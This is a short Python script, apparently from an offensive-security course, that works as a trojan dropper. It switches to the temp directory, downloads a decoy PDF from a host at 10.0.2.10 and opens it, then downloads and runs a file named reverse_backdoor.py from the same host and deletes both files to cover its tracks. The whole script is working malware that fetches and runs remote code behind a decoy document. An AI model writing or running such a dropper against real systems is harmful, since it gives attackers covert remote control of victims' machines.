#!/usr/bin/env python

import subprocess
import tempfile
import requests
import os


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.10/evil-files/sample.pdf")
subprocess.Popen("open sample.pdf", shell=True)

download("http://10.0.2.10/evil-files/reverse_backdoor.py")
subprocess.call("python reverse_backdoor.py", shell=True)

os.remove("sample.pdf")
os.remove("reverse_backdoor.py")
